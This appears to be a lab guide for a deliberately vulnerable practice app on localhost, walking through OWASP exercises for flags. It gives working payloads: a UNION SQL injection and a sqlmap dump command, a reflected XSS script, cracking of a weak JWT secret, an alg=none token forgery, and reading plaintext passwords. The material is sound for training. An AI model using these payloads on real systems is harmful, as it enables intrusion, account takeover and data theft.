# Testing Instructions for OWASP Vulnerabilities

## Part 1: Injection & XSS (A03)

### 1. SQL Injection (`/api/search`)
**Goal**: Extract the `SQL_MASTER` flag.
**Instructions**:
1. Open your browser or a tool like `curl` or `Postman`.
2. Make a GET request to `/api/search` with a UNION-based SQL injection payload in the `q` parameter.
3. Payload: `' UNION SELECT id, flag_name, flag_value, dummy FROM secret_flags --`
   - URL Encoded: `%27%20UNION%20SELECT%20id%2C%20flag_name%2C%20flag_value%2C%20dummy%20FROM%20secret_flags%20--`
4. **URL**: `http://localhost:5000/api/search?q=' UNION SELECT id, flag_name, flag_value, dummy FROM secret_flags --`
5. Observe the JSON response containing the `SQL_MASTER` flag in the "price" or "name" field!
   - Alternatively, you can use `sqlmap`: `sqlmap -u "http://localhost:5000/api/search?q=test" --dump`

### 2. Reflected XSS (`/search`)
**Goal**: Pop an alert box with `XSS_KING` or display it in the console.
**Instructions**:
1. Open your browser and navigate to the application homepage.
2. In the search bar on the top navigation, enter the payload: `<script>alert('XSS_KING')</script>`
3. Press Enter or click the Search button.
4. The page will render the script directly, and an alert box displaying `XSS_KING` will pop up.

## Part 2: Cryptographic Failures & Auth Bypass (A02 & A07)

### 3. Weak JWT Generation (`/api/v2/token`)
**Goal**: Identify that the application uses a weak secret string for JWT signing.
**Instructions**:
1. Using `curl` or `Postman`, send a POST request to `/api/v2/token`:
   ```bash
   curl -X POST http://localhost:5000/api/v2/token -H "Content-Type: application/json" -d '{"username":"student"}'
   ```
2. Copy the returned JWT.
3. Use a tool like `hashcat` or `John the Ripper`, or simply parse it in `jwt.io` and try brute-forcing the secret with a common wordlist. The secret is `secret`.

### 4. JWT Algorithm Bypass (`/api/v2/admin_data`)
**Goal**: Bypass authentication and fetch the `JWT_BYPASS_SUCCESS` flag.
**Instructions**:
1. Take the token generated from `/api/v2/token` or create a new Unsigned JWT encoded in Base64 using a tool like `jwt.io` or Python.
2. Change the header algorithm `alg` to `none`: `{"alg": "none", "typ": "JWT"}` (Base64 URL encoded: `eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0`)
3. Change the payload role to `admin`: `{"role": "admin", "username": "student"}` (Base64 URL encoded: `eyJyb2xlIjogImFkbWluIiwgInVzZXJuYW1lIjogInN0dWRlbnQifQ`)
4. Remove the signature entirely. Build the token joining them with dots: `header.payload.`
5. Send a GET request to `/api/v2/admin_data` with the forged token:
   ```bash
   curl -H "Authorization: Bearer <forged_token>" http://localhost:5000/api/v2/admin_data
   ```
6. Observe the response containing the `JWT_BYPASS_SUCCESS` flag!

### 5. Plaintext Passwords / Crypto Fail (`/api/v1/users/all`)
**Goal**: Verify that passwords are not hashed, indicating a Cryptographic Failure (A02).
**Instructions**:
1. Open your browser or use `curl` to point to the Zombie API endpoint: `http://localhost:5000/api/v1/users/all`.
2. Inspect the JSON response. You will see users listed with their raw, plaintext passwords alongside the injected `CRYPTO_FAIL` flag in the metadata.
